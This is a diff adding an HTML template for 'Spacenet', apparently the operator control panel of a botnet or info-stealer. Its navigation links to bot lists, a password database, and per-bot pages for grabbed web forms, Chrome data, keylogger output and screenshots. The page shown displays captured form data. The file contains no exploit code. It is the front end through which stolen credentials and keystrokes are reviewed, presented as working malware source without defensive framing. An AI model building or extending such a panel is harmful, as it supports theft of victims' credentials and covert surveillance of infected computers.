@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset='utf-8'>
+    <meta http-equiv="X-UA-Compatible" content="chrome=1">
+    <title>Spacenet | {{botid}}</title>
+	<link rel="icon" 
+      type="image/png" 
+      href="/static/images/icon.png">
+    <link rel="stylesheet" type="text/css" href="../static/css/styles.css">
+  </head>
+  <body>
+	  	<div class="cp_container">
+
+	<ul class="cp_bots_fx_ul">
+	  <li class="cp_li"><a href="/cnc" style="all:unset;"><img src="/static/images/logo_spn.png" alt="logo" class="cp_logo"></a></li>
+	  <li class="cp_li" style="float:right"><a href="../disconnect">Logout</a></li>
+	</ul>
+
+	<ul class="cp_ul1_fx" >
+	  <li class="cp_li1"><a href="/cnc">Overview</a></li>
+	  <li class="cp_li1"><a class="active" href="list">Bots</a></li>
+	  <li class="cp_li1"><a href="ossummary">Os</a></li>
+	  <li class="cp_li1"><a href="dbpass">Database</a></li>
+	  <li class="cp_li1"><a href="account">Account</a></li>
+	  <br><hr><br>
+	  <li class="cp_li1"><a class="active" href="getcache?botid={{botid}}">Grabbed forms</a></li>
+	  <li class="cp_li1"><a href="chrome?botid={{botid}}">Chrome data</a></li>
+	  <li class="cp_li1"><a href="keylogger?botid={{botid}}">Keylogger</a></li>
+	  <li class="cp_li1"><a href="screens">Screenshots</a></li>
+	</ul>
+
+	<div class="cp_body" style="margin-top:4.9%;">
+		<p class="cp_title">Grabbed forms</p>
+		<hr><br/>
+		{{Table_preset}}
+	</div>
+
+
+
+
+  </body>
+</html>
